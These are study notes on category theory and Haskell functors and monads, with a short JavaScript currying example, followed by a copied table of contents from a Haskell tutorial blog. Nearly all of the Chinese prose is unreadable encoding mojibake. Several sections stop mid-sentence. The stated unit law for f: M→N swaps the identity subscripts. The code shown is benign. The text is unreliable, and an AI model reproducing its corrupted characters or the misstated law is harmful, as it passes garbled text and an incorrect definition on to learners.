   ËåÉÁï¥ËÆ∫ÊúÄÂ§ßÁöÑÁâπÁÇπÂ∞±ÊòØÂ∞ÜËåÉÁï¥‰∏≠ÁöÑÂØπË±°ÁöÑÁªÜËäÇÂøΩÁï•ÊéâÔºåÂ∞ÜÂØπË±°ÁúãÊàê‰∏Ä‰∏™ÁÇπÔºåÈÄöËøáÊÄÅÂ∞ÑÊù•ÊèèËø∞‰∏Ä‰∏™
   ÂØπË±°ÊòØ‰ªÄ‰πà„ÄÇËÄåÊÄÅÂ∞ÑÂèàÊòØÂèØÁªÑÂêàÁöÑÔºåÂèØÁªÑÂêàÊÄßÊòØËåÉÁï¥ËÆ∫‰∏≠‰∏Ä‰∏™ÈùûÂ∏∏ÈáçË¶ÅÁöÑÊÄßË¥®ÔºåÁªèÂ∏∏Âú®ÊûÑÈÄ†Êï∞ÊçÆ
   Á±ªÂûãÂíåËß£ÂÜ≥ÈóÆÈ¢òÊó∂Áî®Âà∞„ÄÇÊï∞Â≠¶‰∏ä‰ΩøÁî® ‚àò ÔºàcompositionÔºâÁ¨¶Âè∑Ë°®Á§∫ÁªÑÂêàÔºåHaskell ËØ≠Ë®Ä‰∏≠‰ΩøÁî®
   Âè•ÁÇπÔºà.ÔºâË°®Á§∫„ÄÇ

   Êï∞Â≠¶‰∏ä‰ΩøÁî®‰ªé Âüü Âà∞ Èô™Âüü ÁöÑÁÆ≠Â§¥Êù•Ë°®Á§∫ÊÄÅÂ∞ÑÔºå‰æãÂ¶Ç f: X -> Y Ë°®Á§∫ÊÄÅÂ∞Ñ f ÁöÑÂüü‰∏∫ XÔºåÈô™Âüü‰∏∫ Y„ÄÇ
   ÊâÄÊúâ‰ªé X Âà∞ Y ÁöÑÊÄÅÂ∞ÑÈõÜÂêàËÆ∞‰∏∫ homC(X,Y) ÊàñËÄÖ hom(X,Y)„ÄÇ‰πüÊúâÂÜô‰Ωú MorC(X,Y) Êàñ Mor (X,Y)„ÄÇ
   Haskell ‰∏≠ÁöÑÁ±ªÂûãÁ≥ªÁªü‰∏≠Êúâ Arrows Á±ªÂûãÊù•ÊèèËø∞ÊÄÅÂ∞ÑÁöÑÁÆ≠Â§¥Á¨¶Âè∑„ÄÇÊ≥®ÊÑèÔºåÊÄÅÂ∞ÑË°®ËææÂºè‰∏≠ÁöÑÁÆ≠Â§¥Á¨¶Âè∑
   ‰ª£Ë°®ÁöÑÊòØÂÖ≥‰∫é‰∏§ÂØπË±°Èó¥Â≠òÂú®ÁöÑÊüêÁßçÂÖ≥Á≥ªÔºåËøôÊòØÊÄÅÂ∞ÑË°®ËææÂºèÁöÑÈáçÁÇπ„ÄÇÊÄÅÂ∞ÑÂèØ‰ª•Áúã‰ΩúÊòØÂáΩÊï∞ÁöÑÊèêÂçáÔºåÊÄÅÂ∞ÑÊòØÊØîÂáΩÊï∞
   Êõ¥Ê≥õÂåñÁöÑÊò†Â∞Ñ„ÄÇ

   ËåÉÁï¥ÁöÑÊ≠£ÂºèÂÆö‰πâÂ¶Ç‰∏ãÔºåÂåÖÂê´ 2 Á±ªÂØπË±°„ÄÅ2 ÁßçËøêÁÆóÂíå 2 Êù°ËøêÁÆóËßÑÂàôÔºåÂéüÊñáÂºïÁî®Ëá™ÊñØÂù¶Á¶èÂì≤Â≠¶ÁôæÁßëÊñáÊ°£ÔºöÔºö
   ::


1.ÂüüËøêÁÆóÔºöÁªôÊØè‰∏™ÊÄÅÂ∞ÑÊåáÂÆöËåÉÁï¥‰∏≠‰∏Ä‰∏™ÂØπË±°„ÄÇ
2.Èô™ÂüüËøêÁÆóÔºöÁªôÊØè‰∏™ÊÄÅÂ∞ÑÊåáÂÆöËåÉÁï¥‰∏≠‰∏Ä‰∏™ÂØπË±°„ÄÇ
ÊÄÅÂ∞ÑÁªèÂ∏∏Áî®‰ªéÂÖ∂ÂüüÂà∞ÂÖ∂Èô™ÂüüÁöÑÁÆ≠Â§¥Êù•Ë°®Á§∫Ôºå‰æãÂ¶ÇËã•‰∏Ä‰∏™ÊÄÅÂ∞ÑfÂüü‰∏∫XËÄåÈô™Âüü‰∏∫YÔºåÂÆÉËÆ∞‰∏∫f:X‚ÜíY„ÄÇÊâÄÊúâ‰ªéXÂà∞YÁöÑÊÄÅÂ∞ÑÈõÜÂêàËÆ∞‰∏∫homC(X,Y)ÊàñËÄÖhom(X,Y)„ÄÇÔºàÊúâ‰∫õ‰ΩúËÄÖÈááÁî®MorC(X,Y)ÊàñMor(X,Y)Ôºâ„ÄÇ
3.Â§çÂêàËøêÁÆóÔºöÂØπ‰∫é<f:X‚ÜíY,g:Y‚ÜíZ>ÔºåÊåáÂÆöÔºàÊàñgfÂíåfgÔºâ„ÄÇÊÄÅÂ∞ÑÁöÑÂ§çÂêàÁªèÂ∏∏ÈááÁî®‰∫§Êç¢ÂõæË°®Êù•Ë°®Á§∫„ÄÇ
4.Âçï‰ΩçËøêÁÆóÔºöÂØπ‰∫éÊØè‰∏™ÂØπË±°XÔºåÊåáÂÆö‰∏Ä‰∏™ÊÄÅÂ∞ÑidX:X‚ÜíXÔºåÁß∞‰∏∫X‰∏äÁöÑÂçï‰ΩçÊÄÅÂ∞Ñ„ÄÇ

      ÊÄÅÂ∞ÑÂøÖÈ°ªÊª°Ë∂≥‰∏§Êù°ËøêÁÆóËßÑÂàôÔºö

         *  Âçï‰ΩçÂæãÔºàunit lawÔºâÔºöÂØπ‰∫éÊØè‰∏™ÂØπË±° XÔºåÂ≠òÂú®‰∏Ä‰∏™ÊÅíÁ≠âÊÄÅÂ∞Ñ 
            id‚Çì : X ‚Üí X ‰ΩøÂæóÂØπ‰∫éÊØè‰∏™ÊÄÅÂ∞Ñ f : M ‚Üí N Êúâ id‚Çò ‚àò f = f = f ‚àò id‚Çô
         *  ÁªìÂêàÂæãÔºàassociativityÔºâÔºöh ‚àò (g ‚àò f) = (h ‚àò g) ‚àò f Â≠òÂú®‰∫é‰ªª‰ΩïÊìç‰ΩúÊúâÂÆö‰πâÁöÑÊó∂ÂÄô„ÄÇ

      Âçï‰ΩçÂæã‰πüÊúâÁß∞‰∏∫Âπ∫ÂÖÉÂæã„ÄÅÂπ∫Âæã„ÄÇÊÅíÁ≠âÊÄÅÂ∞Ñ‰πüÁß∞‰∏∫Âçï‰ΩçÊÄÅÂ∞ÑÔºàidentity morphismsÔºâÔºåÊòØÊï∞Â≠¶‰∏≠‰ºóÂ§ö
      Âçï‰ΩçÂÖÉÁöÑ‰∏Ä‰∏™„ÄÇÂçï‰ΩçÂÖÉÁöÑÁâπÁÇπÂ∞±ÊòØÔºö‰ªª‰ΩïÂØπË±°‰∏é‰πãËøêÁÆó‰øùÊåÅËøô‰∏™ÂØπË±°‰∏çÂèò„ÄÇ

   ÊÄÅÂ∞ÑÂ∏∏Áî®Áä∂ÊÄÅËΩ¨Êç¢ÂõæË°®Á§∫Ôºå‰ª•‰∏ãÂ±ïÁ§∫‰∫ÜËåÉÁï¥ËÆ∫ÁöÑÊÄÅÂ∞ÑËΩ¨Êç¢ÂõæÁöÑÊäΩË±°Ë°®Ëææ‰∏éÂÖ∑Ë±°Ë°®Ëææ„ÄÇÂ∑¶‰æßÂØπÂ∫îÁöÑÊòØÂÖ∑Ë±°Âåñ
   ÊÄÅÂ∞ÑËΩ¨Êç¢Âõæ„ÄÇËìùËâ≤ÁÆ≠Â§¥„ÄÅÁ¨¶Âè∑Ë°®Á§∫ÊÄÅÂ∞ÑÊú¨Ë∫´ÔºàÂç≥ËåÉÁï¥ÂØπË±°Èó¥ÁöÑÊò†Â∞ÑÂÖ≥Á≥ªÔºâÔºåÁ∫¢Ëâ≤Â§ßÂÜôÂ≠óÊØçË°®Á§∫ËåÉÁï¥ÔºàÂØπË±°ÈõÜÂêàÔºâÔºå
   ËåÉÁï¥ ùî∏ ÂèØ‰ª•ÂÖ∑Ë±°Âåñ‰∏∫‰∏Ä‰∏™Áè≠Á∫ßÁöÑÂ≠¶ÁîüÔºåËåÉÁï¥ ùîπ ÊòØÂπ¥ÈæÑÔºåËåÉÁï¥ ‚ÑÇ ÊòØÂ∏ÉÂ∞îÂÄº„ÄÇùî∏ ÈÄöËøá Age ÊÄÅÂ∞ÑÊò†Â∞Ñ‰∏∫ ùîπÔºå
   ÂÜçÈÄöËøá ‚â• 18„ÄÄÊò†Â∞Ñ‰∏∫ ‚ÑÇ„ÄÇÈÄöËøáÁªÑÂêàÔºàcompositionÔºâÊÄÅÂ∞ÑÔºå‚â• 18 ‚àò AgeÔºåùî∏ Áõ¥Êé•Êò†Â∞Ñ‰∏∫ ‚ÑÇ„ÄÇËøôÈáåÊ≤°Êúâ
   Ê†áÊòéÂçï‰ΩçÂÖÉÔºåÂè™ÈúÄË¶ÅÁü•ÈÅìÂ≠òÂú®ËøôÊ†∑ÁöÑ idÔºåÂÆÉ‰∏éÂÖ∂ÂÆÉÂØπË±°ËøêÁÆóÔºåÂç≥ÁªèËøáÂçï‰ΩçÊÄÅÂ∞ÑÊò†Â∞ÑÂèàÂõûÂà∞Ëøô‰∏™ÂØπË±°ÁöÑËá™Ë∫´„ÄÇ
   Âú®ËÆ°ÁÆóÊú∫ÁºñÁ®ãËØ≠Ë®ÄÈ¢ÜÂüüÔºåÂÆÉÂ∞±Â¶ÇÂêå self ÂÖ≥ÈîÆÂ≠ó‰∏ÄÊ†∑„ÄÇÈù¢ÂêëÂØπË±°ÁºñÁ®ã‰∏≠ÁöÑÂ§öÊÄÅÔºàpolymorphismsÔºâÂèØ‰ª•
   Áúã‰ΩúÊòØÊÄÅÂ∞ÑÊ¶ÇÂøµÁöÑÂª∂‰º∏„ÄÇ

   ÁîöËá≥ÂÖ∑Ë±°Âåñ‰∏∫Êõ¥ÁÆÄÂçïÁöÑÂΩ¢ÂºèÔºåùî∏ ‰∏∫Êï∞Â≠ó 1Ôºåùîπ ‰∏∫Êï∞Â≠ó 2Ôºå‚ÑÇ ‰∏∫Êï∞Â≠ó 4ÔºåËÄåÂÆÉ‰ª¨‰πãÈó¥ÁöÑÊÄÅÂ∞ÑÂåÄ‰∏∫ ``2 ÁöÑ‰πòÊñπ``„ÄÇ
   ËøôÂ∞±Â∞ÜÈ´òÂ∫¶ÊäΩË±°ÁöÑËåÉÁï¥ËΩ¨Êç¢ÂõûÂà∞ÂàùÁ≠â‰ª£Êï∞ÔºåÂΩìÁÑ∂ËøôÂπ∂ÈùûÊòØËÆæËÆ°ËåÉÁï¥ËøôÁßçÈ´òÂ∫¶ÊäΩË±°ÁöÑÊï∞Â≠¶ÁªìÊûÑÁöÑÊú¨ÊÑè„ÄÇ

   .. figure:: ./pictures/category_concretization.svg

      `An Introduction to Category Theory, Abstraction and Algebra <https://www.bilibili.com/video/BV1LP411W7Ab>`__


                           ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
                           ‚îÇAllliccce‚îÇ
                           ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                                ‚îÇ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
                                ‚îÇ      ‚îÇ
                                ‚îÇ<<<‚îÄ‚îÄ‚îÄ‚îò
                                ‚îÇ
                           ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îê
                           ‚îÇAllliccce‚îÇ
                           ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò



   

   Âçï‰ΩçÊÄÅÂ∞ÑÔºàidentity morphismsÔºâÊàñËÄÖ

   ÂáΩÂ≠êÂèØ‰ª•Ëß£Èáä‰∏∫ Â∞èËåÉÁï¥Ôºàsmall category) ÂÜÖÁöÑ ÊÄÅÂ∞Ñ„ÄÇ

   ÈõÜÂêàËåÉÁï¥ÂèØ‰ª•ÊâæÂà∞ÂØπ‰ΩçÁöÑÊèèËø∞Ôºåobjects ÂØπÂ∫î setsÔºåmorphisms ÂØπÂ∫î functionsÔºåËøôÂèØ‰ª•
   Èôç‰ΩéËåÉÁï¥ÁöÑÊäΩË±°Á®ãÂ∫¶ÔºåÂ∏ÆÂä©ÁêÜËß£ËåÉÁï¥Ëøô‰∏ÄÊäΩË±°Ê¶ÇÂøµ„ÄÇ

   *  ÂêåÊÄÅ homomorphism
      ÊÑè‰πâÔºöÊèê‰æõ‰∫Ü‰∏ÄÁßçÁÆÄÂåñÁ†îÁ©∂ÂØπË±°ÁªìÊûÑ‰ΩÜÊòØ‰øùÁïô‰∫ÜÂéüÂõæÈÇªÊé•ÂÖ≥Á≥ªÁöÑ‰∏ÄÁßçÊñπÊ≥ï.

      ÂÆö‰πâÔºöÁªôÂÆöÂõæ G,H
      ÔºåËã•Â≠òÂú®Êò†Â∞Ñ f:V(G)‚ÜíV(H)
       ‰ΩøÂæó uv‚ààE(G)
       ÂèØ‰ª•Êé®Âá∫ f(u)f(v)‚ààE(H)
      ÔºåÂàôÁß∞ G
       ÂêåÊÄÅ‰∫é H
      ÔºåËÆ∞‰∏∫ G‚ÜíH
      Ôºå‰πüÁß∞ G
       ÊòØ H
      -ÂèØÁùÄËâ≤ÁöÑÔºàÂõæ H
       ÁöÑ‰ªªÊÑè‰∏ÄÁßçÊ≠£Â∏∏ÁùÄËâ≤ÂèØ‰ª•ÁªôÂá∫Âõæ G
       ÁöÑ‰∏ÄÁßçÊ≠£Â∏∏ÁùÄËâ≤Ôºâ.

      ‰∏äÈù¢ f
       Âè™ÊòØÊò†Â∞ÑÔºåÂèØËÉΩ‰∏çÊòØÂçïÂ∞ÑÔºàÂ•ΩÂá†‰∏™ËêùÂçúÊîæÂà∞‰∏Ä‰∏™ÂùëÈáå‰∫ÜÔºâÔºå‰πüÂèØ‰ª•‰∏çÊòØÊª°Â∞ÑÔºàÊúâÁöÑÂùëÈáåÊ≤°ÊúâËêùÂçúÔºâ.

   *  ÂêåÊûÑ isomorphism
      Ëã• f
       ÊòØÂèåÂ∞ÑÔºåÂàôÁß∞ G
       ÂêåÊûÑ‰∫é H
      . Ê≠§Êó∂‰∏§‰∏™ÂõæÊúâÁõ∏Á≠âÊï∞ÁõÆÁöÑÈ°∂ÁÇπÂíåËæπ.

      Âõæ G
       ÁöÑ‰∏≠ÂøÉ core ÊòØ G
       ÁöÑ‰∏Ä‰∏™ÊûÅÂ∞èÂ≠êÂõæ H
       ‰∏îÊª°Ë∂≥ G‚ÜíH
      . Âú®ÂêåÊûÑÊÑè‰πâ‰∏ãÔºå‰ªªÊÑèÂõæ G
       Âè™Êúâ‰∏Ä‰∏™ core.

   *  ÂêåËÉö homeomorphism
      ÂÆö‰πâÔºöÁªôÂÆöÂõæ G,H
      ÔºåËã• G
       ÁöÑÊüê‰∏™ÁªÜÂàÜÂõæÂêåÊûÑ‰∫é H
       ÁöÑÊüê‰∏™ÁªÜÂàÜÂõæÔºàsubdivisionÔºåËæπ‰∏äÊ∑ªÂä†2Â∫¶ÁÇπÔºâÔºåÂàôÁß∞ G
       Âíå H
       ÂêåËÉö.

   ÂçïÂ≠êÔºàMonadÔºâÊòØËåÉÁï¥ËÆ∫‰∏≠ÁöÑ‰∏Ä‰∏™Âü∫Êú¨Ê¶ÇÂøµÔºåÂçïÂ≠êÂèàÁß∞‰∏∫‰∏âÂ≠êÔºàtripleÔºâÔºåÂçïÂ≠êÊòØËá™ÂáΩÂ≠êËåÉÁï¥‰∏äÁöÑ‰∏Ä‰∏™"Âπ∫ÂçäÁæ§"Ôºå
   ËåÉÁï¥ C Âà∞Ëá™Ë∫´ÁöÑÂáΩÂ≠êÁß∞‰∏∫ËØ•ËåÉÁï¥ÁöÑËá™ÂáΩÂ≠ê (endofunctor)„ÄÇÊÅíÁ≠âÂáΩÂ≠êÔºàidentity functorÔºâ
   Â∞±ÊòØ‰∏Ä‰∏™ÂçïÂ≠êÔºåÂπ∂‰∏îÊ≤°ÊúâÂâØ‰ΩúÁî®Ôºàside effectsÔºâ„ÄÇ

      Definition 2.2. A monad on a category C is a triple (T, Œ∑, ¬µ), 
      where T : C ‚Üí C is an endofunctor and Œ∑ : Id_C ‚áí T 
      and ¬µ : T¬≤ ‚áí T are natural transformations

      On Some Aspects of The Theory of Monads - Carsen Berger
      https://math.uchicago.edu/~may/VIGRE/VIGRE2011/REUPapers/Berger.pdf



   ÂáΩÊï∞ÂºèÁºñÁ®ã‰∏≠Â∏∏ËßÅÁöÑÊûÑÈÄ†ÊòØ„ÄåÂáΩÂ≠ê„ÄçÔºàfunctorÔºâÔºåHaskell ÈáåÁöÑ ``Maybe`` ÊòØ‰∏™ÂæàÂ•ΩÁöÑ‰æãÂ≠êÔºå
   ÂÆÉÊòØÁ≥ªÁªüÂ∫ìÂÆö‰πâÁöÑ‰∏Ä‰∏™Á±ªÂûãÔºå‰∏Ä‰∏™ ``Monad`` Á±ªÂûãÂÆû‰æãÔºåÂõ†Ê≠§ÂÆÉÊòØ‰∏Ä‰∏™ÂáΩÂ≠ê„ÄÇ

   Maybe Á±ªÂûã‰ΩøÁî® ``data`` ÂÖ≥ÈîÆÂ≠óÂÆö‰πâ„ÄÇJust a Âíå ``Nothing`` ÊòØ‰∏§‰∏™ÊûÑÈÄ†Âô®ÔºåÂâçËÄÖ‰ª£Ë°®‰∏Ä‰∏™ÂÄºÔºå
   ÂêéËÄÖ‰ª£Ë°®Ê≤°ÊúâÂÄºÔºåÈÄöÂ∏∏‰ª£Ë°®Êìç‰ΩúËøîÂõûÁöÑ failure Áä∂ÊÄÅÔºö
   ::

      -- data Maybe a = Just a | Nothing

      ghci> :t Nothing
      Nothing :: Maybe a

      ghci> :t Just 'a'
      Just 'a' :: Maybe Char

      ghci> :t Just 1
      Just 1 :: Num a => Maybe a 

   maybe ÂáΩÊï∞Êé•Êî∂‰∏â‰∏™ÂèÇÊï∞Ôºöa default value, a function, a Maybe value
   Â¶ÇÊûúÊé•Êî∂Âà∞ÁöÑ Maybe ÁöÑÂÄºÊòØ NothingÔºåÈÇ£‰πàËøîÂõûÈªòËÆ§ÂÄº„ÄÇÂê¶ÂàôÔºåÂØπ Just ÂÄºË∞ÉÁî®ÂáΩÊï∞ (a -> b) Ëé∑ÂèñËøîÂõûÂÄº„ÄÇ
   ::

      ghci> :t maybe
      maybe :: b -> (a -> b) -> Maybe a -> b

      ghci> maybe False even (Just 2)
      True

      ghci> maybe False odd  (Just 3)
      True

   ÂÅáËÆæÊúâ‰∏Ä‰∏™Áî®‰∫éÊ±ÇÂíåÁöÑ JavaScript ÂáΩÊï∞ add(a, b, c)ÔºåÂÆÉÊé•Êî∂‰∏â‰∏™Êï∞ÂÄºÂπ∂ËøîÂõûÂÆÉ‰ª¨ÁöÑÂíå„ÄÇ
   ËøôÊòæÁ§∫‰∏çÁ¨¶Âêà Currying ÂåñÁöÑ‰∏Ä‰∏™ÂáΩÊï∞Ôºå‰ª•‰∏ãÂ∞ùËØïÂ∞ÜÂÆÉËΩ¨Êç¢‰∏∫ currying ÂΩ¢ÂºèÔºö

   .. code-block:: JavaScript

      function add(a, b, c)
      {
         return a + b + c;
      }

      function add_curried(n)
      {
         let sum = n;
         let add = (n) => { return n==null? sum : (sum += n, add) };
         return add
      }

   ËΩ¨Êç¢‰∏∫ currying ÂΩ¢ÂºèÂêéÁöÑ add_curried(n) Âè™Êé•Êî∂‰∏Ä‰∏™ÂèÇÊï∞ÔºåÂÆÉÂÜÖÈÉ®‰ΩøÁî®‰∫Ü JavaScript ÁÆ≠Â§¥
   ÂáΩÊï∞Êù•ÁÆÄÂåñË°®ËææÂºèÔºåËøô‰∏™ÂáΩÊï∞ÂÜÖÈÉ®Âà§Êñ≠Âú®Ê≤°‰º†ÂÖ•ÂèÇÊï∞ÁöÑÊÉÖÂÜµ‰∏ãÊâçËæìÂá∫ sum ÂÄºÔºåÂäüËÉΩ‰∏äÂíåÂéüÂáΩÊï∞Êúâ‰∫õÂá∫ÂÖ•„ÄÇ
   Âπ∂‰∏îÔºå‰πü‰∏çÂ§™Á¨¶Âêà Haskell ÁöÑÊÉ∞ÊÄßÊ±ÇÂÄºÔºàLazy EvaluationÔºâ„ÄÇ‰ΩÜÊòØÔºåËøôÁßçËæìÂÖ•‰∏Ä‰∏™ÂÄºÔºåËæìÂá∫‰∏Ä‰∏™
   ÂØπÂ∫îÂÄºÁöÑÂΩ¢ÂºèÂ∞±ÊòØ functor ÁöÑÂÖ∏ÂûãË°å‰∏∫„ÄÇ

   ÂΩì‰∏Ä‰∏™Êé•Êî∂‰∏Ä‰∏™ÂèÇÊï∞ a Âπ∂ËøîÂõû‰∏Ä‰∏™ bÔºåËøô‰∏™ÂáΩÊï∞Á≠æÂêçÂ∞±Áî® a -> b Ë°®Á§∫„ÄÇÂáΩÂ≠ê

   IO Monad Á±ªÂûãÈÉΩÊòØÊúâÂâØ‰ΩúÁî®ÁöÑÁ±ªÂûãÔºåÂõ†‰∏∫ÈúÄË¶ÅÊìç‰Ωú I/OÔºåËæìÂÖ•Â≠óÁ¨¶‰∏ÄËà¨‰∏éÊñá‰ª∂ËÆæÂ§áÂØπÂ∫î„ÄÇ

   ‰ª•‰∏ãÊòØ Haskell ‰∏âÁ±ªÊúÄÂü∫Êú¨ÁöÑÂáΩÂ≠êÁ±ªÂûãËØ¥ÊòéÔºåÂÆÉ‰ª¨‰æùÊ¨°‰∏∫Ê¥æÁîüÂÖ≥Á≥ªÔºåÂèØÁî® :type ÂëΩ‰ª§Êü•ÁúãÂÖ∂Á±ªÂûã‰ø°ÊÅØÔºö
   
   .. code-block:: haskell

      -- Functor:
      fmap  ::     Functor f => (a -> b) -> f a -> f b

      -- Applicative:
      (<*>) :: Applicative f => f (a -> b) -> f a -> f b

      -- Monad:
      (>>=) ::       Monad m => m a -> (a -> m b) -> m b

   fmap 

   .. code-block:: haskell

      ghci> fmap (+1) [1,2,3]
      [2,3,4] 



======================
/Haskell for Beginners
======================
*   Â≠¶‰π†‰∏ÄÈó®Êñ∞ËØ≠Ë®Ä‰πãHaskell https://blog.tonycrane.cc/p/b3ca5c18.html

.. container:: content

   .. rubric:: ÁõÆÂΩï
      :name: ÁõÆÂΩï
      :class: menu-label

      ÁõÆÂΩï

         #0  ÊÄªÁ´†
         #1  Âü∫Á°ÄËØ≠Ê≥ï‰∏éÂáΩÊï∞
         #2  È´òÈò∂ÂáΩÊï∞‰∏éÊ®°Âùó
         #3  Á±ªÂûã‰∏éÁ±ªÂûãÁ±ª
         #4  ËæìÂÖ•ËæìÂá∫‰∏éÊñá‰ª∂
         #5  ÂáΩÂ≠ê„ÄÅÂ∫îÁî®ÂáΩÂ≠ê‰∏éÂçïÂ≠ê
         #6  ÂçäÁæ§‰∏éÂπ∫ÂçäÁæ§
         #7  ‰∏Ä‰∫õÂÖ∂ÂÆÉÁ±ªÂûãÁ±ª
         #A  Haskell ‰∏éËåÉÁï¥ËÆ∫


      -  `1 ÂâçË®Ä <#ÂâçË®Ä>`__
      -  `2 Âü∫Á°ÄËøêÁÆó <#Âü∫Á°ÄËøêÁÆó>`__

         -  `2.1 ÂáΩÊï∞Ë∞ÉÁî® <#ÂáΩÊï∞Ë∞ÉÁî®>`__

      -  `3 List <#List>`__

         -  `3.1 Texas ranges <#Texas-ranges>`__
         -  `3.2 List comprehension <#List-comprehension>`__

      -  `4 Tuple <#Tuple>`__
      -  `5 Syntax in Functions <#Syntax-in-Functions>`__

         -  `5.1 Pattern matching <#Pattern-matching>`__
         -  `5.2 Guard syntax <#Guard-syntax>`__
         -  `5.3 Case expressions <#Case-expressions>`__
         -  `5.4 where <#where>`__
         -  `5.5 let <#let>`__
         -  `5.6 if statement <#if-statement>`__

      -  `6 Higher Order Functions <#Higher-Order-Functions>`__

         -  `6.1 Currying <#Currying>`__
         -  `6.2 ‰∏Ä‰∫õÈ´òÈò∂ÂáΩÊï∞ <#‰∏Ä‰∫õÈ´òÈò∂ÂáΩÊï∞>`__

            -  `6.2.1 zipWith <#zipWith>`__
            -  `6.2.2 flip <#flip>`__
            -  `6.2.3 map <#map>`__
            -  `6.2.4 filter <#filter>`__
            -  `6.2.5 takeWhile <#takeWhile>`__

         -  `6.3 Function application <#Function-application>`__
         -  `6.4 Function Composition <#Function-Composition>`__
         -  `6.5 lambda <#lambda>`__
         -  `6.6 foldÂíåscan <#foldÂíåscan>`__

            -  `6.6.1 foldl <#foldl>`__
            -  `6.6.2 foldr <#foldr>`__
            -  `6.6.3 scanlÂíåscanr <#scanlÂíåscanr>`__
            -  `6.6.4 ‰ΩøÁî®foldrÁºñÂÜôfoldl <#‰ΩøÁî®foldrÁºñÂÜôfoldl>`__

      -  `7 Modules <#Modules>`__

         -  `7.1 ÁºñÂÜôModules <#ÁºñÂÜôModules>`__

      -  `8 Types & Typeclasses <#Types-amp-Typeclasses>`__

         -  `8.1 Types <#Types>`__
         -  `8.2 Typeclasses <#Typeclasses>`__
         -  `8.3 Type variables <#Type-variables>`__
         -  `8.4 ÂÆö‰πâÊñ∞Type <#ÂÆö‰πâÊñ∞Type>`__

            -  `8.4.1 ÂØºÂá∫Type <#ÂØºÂá∫Type>`__
            -  `8.4.2 Record Syntax <#Record-Syntax>`__
            -  `8.4.3 Type parameters <#Type-parameters>`__
            -  `8.4.4 Either <#Either>`__
            -  `8.4.5 Derived instances <#Derived-instances>`__
            -  `8.4.6 Type synonyms <#Type-synonyms>`__
            -  `8.4.7 newtype keyword <#newtype-keyword>`__
            -  `8.4.8 Recursive data structures <#Recursive-data-structures>`__

         -  `8.5 ÂÆö‰πâÊñ∞Typeclass <#ÂÆö‰πâÊñ∞Typeclass>`__

            -  `8.5.1 ÊâãÂä®ÂàõÂª∫ÂÆû‰æã <#ÊâãÂä®ÂàõÂª∫ÂÆû‰æã>`__
            -  `8.5.2 Functor Typeclass <#Functor-Typeclass>`__

         -  `8.6 Kinds <#Kinds>`__

      -  `9 Input/Output <#Input-Output>`__

         -  `9.1 ËøêË°åHaskellÁ®ãÂ∫è <#ËøêË°åHaskellÁ®ãÂ∫è>`__
         -  `9.2 ËæìÂá∫ÊñáÊú¨ <#ËæìÂá∫ÊñáÊú¨>`__

            -  `9.2.1 do block <#do-block>`__

         -  `9.3 ËæìÂÖ•ÊñáÊú¨ <#ËæìÂÖ•ÊñáÊú¨>`__
         -  `9.4 ÂÖ∂‰ªñIOÁõ∏ÂÖ≥ÂáΩÊï∞Áî®Ê≥ï <#ÂÖ∂‰ªñIOÁõ∏ÂÖ≥ÂáΩÊï∞Áî®Ê≥ï>`__

            -  `9.4.1 return <#return>`__
            -  `9.4.2 when <#when>`__
            -  `9.4.3 sequence <#sequence>`__
            -  `9.4.4 mapM & mapM\_ <#mapM-amp-mapM>`__
            -  `9.4.5 forever <#forever>`__
            -  `9.4.6 forM <#forM>`__
            -  `9.4.7 getContents <#getContents>`__
            -  `9.4.8 interact <#interact>`__

         -  `9.5 Êñá‰ª∂ÂíåÊµÅ <#Êñá‰ª∂ÂíåÊµÅ>`__

            -  `9.5.1 openFile <#openFile>`__
            -  `9.5.2 withFile <#withFile>`__
            -  `9.5.3 readFile <#readFile>`__
            -  `9.5.4 writeFile <#writeFile>`__
            -  `9.5.5 appendFile <#appendFile>`__
            -  `9.5.6 buffer <#buffer>`__
            -  `9.5.7 openTempFile <#openTempFile>`__

         -  `9.6 Ë∑ØÂæÑÊìç‰Ωú <#Ë∑ØÂæÑÊìç‰Ωú>`__

            -  `9.6.1 getCurrentDirectory <#getCurrentDirectory>`__
            -  `9.6.2 removeFile <#removeFile>`__
            -  `9.6.3 renameFile <#renameFile>`__
            -  `9.6.4 doesFileExist <#doesFileExist>`__

         -  `9.7 Command line arguments <#Command-line-arguments>`__

            -  `9.7.1 getArgs <#getArgs>`__
            -  `9.7.2 getProgName <#getProgName>`__

         -  `9.8 Randomness <#Randomness>`__

            -  `9.8.1 random <#random>`__
            -  `9.8.2 randoms <#randoms>`__
            -  `9.8.3 randomR <#randomR>`__
            -  `9.8.4 randomRs <#randomRs>`__
            -  `9.8.5 getStdGen <#getStdGen>`__
            -  `9.8.6 newStdGen <#newStdGen>`__

         -  `9.9 Exceptions <#Exceptions>`__

      -  `10 Functors <#Functors>`__

         -  `10.1 Functor ÂÆû‰æã <#FunctorÂÆû‰æã>`__

            -  `10.1.1 [] <#>`__
            -  `10.1.2 Maybe <#Maybe>`__
            -  `10.1.3 Either a <#Either-a>`__
            -  `10.1.4 IO <#IO>`__
            -  `10.1.5 (,) a <#a>`__
            -  `10.1.6 (->) r <#gt-r>`__

         -  `10.2 Functor Laws <#Functor-Laws>`__
         -  `10.3 Intuition <#Intuition>`__
         -  `10.4 Â∏∏Áî®ÂáΩÊï∞ <#Â∏∏Áî®ÂáΩÊï∞>`__

            -  `10.4.1 <$> <#lt-gt>`__
            -  `10.4.2 $> <#gt>`__
            -  `10.4.3 void <#void>`__

      -  `11 Applicative Functor <#Applicative-Functor>`__

         -  `11.1 Applicative Functor ÂÆû‰æã <#Applicative-FunctorÂÆû‰æã>`__

            -  `11.1.1 Maybe <#Maybe-1>`__
            -  `11.1.2 [] <#-1>`__
            -  `11.1.3 IO <#IO-1>`__
            -  `11.1.4 (->) r <#gt-r-1>`__
            -  `11.1.5 ZipList <#ZipList>`__

         -  `11.2 Applicative Functor Laws <#Applicative-Functor-Laws>`__
         -  `11.3 Intuition <#Intuition-1>`__
         -  `11.4 Â∏∏Áî®ÂáΩÊï∞ <#Â∏∏Áî®ÂáΩÊï∞-1>`__

            -  `11.4.1 liftA & liftA2 & liftA3 <#liftA-amp-liftA2-amp-liftA3>`__
            -  `11.4.2 <\* & \*> <#lt-amp-gt>`__
